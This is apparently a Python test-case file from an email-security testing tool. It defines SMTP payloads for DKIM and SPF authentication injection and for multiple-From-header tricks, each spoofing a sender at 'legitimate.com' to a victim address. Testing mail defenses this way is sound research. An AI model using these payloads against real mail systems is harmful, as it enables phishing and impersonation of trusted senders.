from common.common import *

test_cases = {
    "case_a4": { # An example of DKIM authentication injection attack
        "case_name":b"DKIM authentication injection attack\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b"legitimate.com'a.attack.com", "s":b"selector", "sign_header": b"From: <security@legitimate.com>"},
        "data": {
            "from_header": b"From: <security@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",

            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_a7": { # A example of SPF authentication results injection attack
        "case_name":b"SPF authentication results injection attack\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<@legitimate.com,@any.com:'any@a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <security@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: SPF authentication results injection attack\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_b1": { 
        "case_name":b"Multiple from in addr-specs without Sender\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <security@legitimate.com>,\r\n\t<security2@legitimate.com>,\r\n\t<security3@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: Multiple from in addr-specs without Sender\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_b2": {
        "case_name":b"Multiple from in header name without Sender\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <security@legitimate.com>\r\nFrom: <security2@legitimate.com>\r\nFrom: <security3@legitimate.com >\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: Multiple from in header name\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_b3": {
        "case_name":b"Multiple from in addr-specswith Sender\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <security@legitimate.com>,\r\n\t<security2@legitimate.com>,\r\n\t<security3@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: Multiple from in addr-specswith Sender\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"Sender: <sender@legitimate.com>\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_b4": {
        "case_name":b"Multiple from in header name with Sender\r\n",
        "helo": b"attack.com",
        "mailfrom": b"<test@a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <security@legitimate.com>\r\nFrom: <security2@legitimate.com>\r\nFrom: <security3@legitimate.com >\r\nSender: <sender@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: Multiple from in header name with Sender\r\n",
            "body": b"Hi, fake body here.\r\n",
            "custom": b"Sender: <sender@legitimate.com>\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },

}

